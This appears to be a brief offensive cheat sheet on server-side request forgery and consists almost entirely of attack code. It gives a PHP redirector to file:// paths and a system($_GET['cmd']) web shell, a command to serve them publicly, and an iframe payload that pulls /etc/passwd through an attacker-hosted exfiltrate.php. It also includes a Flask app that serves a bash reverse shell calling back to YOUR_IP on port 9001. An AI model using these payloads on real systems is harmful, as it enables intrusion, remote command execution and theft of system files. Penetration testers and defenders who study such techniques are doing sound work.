# SSRF

PHP File:
```php
<?php header('location:file://'.$_REQUEST['x']); ?>
<?php system($_GET["cmd"]);?>
```

Start Server:
```sh
php -S 0.0.0.0:9001
```

Payload Example:
```html
<iframe height="2000" width="800" src="http://<yourip>:9001/exfiltrate.php?x=/etc/passwd"></iframe>
```

## Flask Example
```python
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello_world():
    return """#!/bin/bash
bash -c 'bash -i >& /dev/tcp/YOUR_IP/9001 0>&1'
"""
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```